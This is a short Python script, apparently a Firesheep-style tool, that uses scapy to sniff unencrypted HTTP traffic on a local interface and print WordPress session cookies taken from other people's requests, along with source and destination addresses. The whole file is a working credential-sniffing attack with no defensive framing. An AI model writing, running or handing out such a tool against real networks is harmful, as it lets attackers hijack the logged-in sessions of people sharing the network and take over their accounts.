import re
from scapy.all import *
def fireCatcher(pkt):
    raw = pkt.sprintf('%Raw.load%')
    r = re.findall('wordpress_[0-9a-fA-F]{32}', raw)
    if r and 'Set' not in raw:
        print(pkt.getlayer(IP).src+ ">"+pkt.getlayer(IP).dst+" Cookie:"+r[0])

conf.iface = "en0"
sniff(filter="tcp port 80",prn=fireCatcher)